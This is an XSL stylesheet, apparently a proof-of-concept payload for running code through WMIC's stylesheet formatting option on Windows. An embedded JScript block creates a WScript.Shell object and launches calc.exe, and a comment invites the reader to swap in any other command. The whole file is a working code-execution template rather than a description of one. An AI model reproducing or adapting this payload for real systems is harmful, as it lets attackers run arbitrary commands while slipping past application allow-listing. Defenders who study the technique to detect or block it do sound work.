<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:vb="urn:the-xml-files:xslt-vb" xmlns:user="placeholder" version="1.0">
<xsl:output method="text" omit-xml-declaration="yes" indent="no"/>
<xsl:strip-space elements="*" />
<ms:script implements-prefix="user" language="JScript">
	<![CDATA[

		//EDIT THIS LINE TO RUN SOMETHING OTHER THAN CALC
		var r = new ActiveXObject("WScript.Shell").Run("calc.exe")
		
 	]]>
</ms:script>
<xsl:template match="/"><xsl:apply-templates select="//RESULTS"/><xsl:apply-templates select="//INSTANCE"/><xsl:value-of select="user:DisplayValues(.)"/></xsl:template>
<xsl:template match="RESULTS"><xsl:value-of select="user:CountResults(.)"/></xsl:template>
<xsl:template match="INSTANCE"><xsl:value-of select="user:GotInstance()"/><xsl:apply-templates select="PROPERTY|PROPERTY.ARRAY|PROPERTY.REFERENCE"/></xsl:template>
<xsl:template match="PROPERTY|PROPERTY.ARRAY|PROPERTY.REFERENCE"><xsl:value-of select="user:GetValues(.)"/></xsl:template>
</xsl:stylesheet>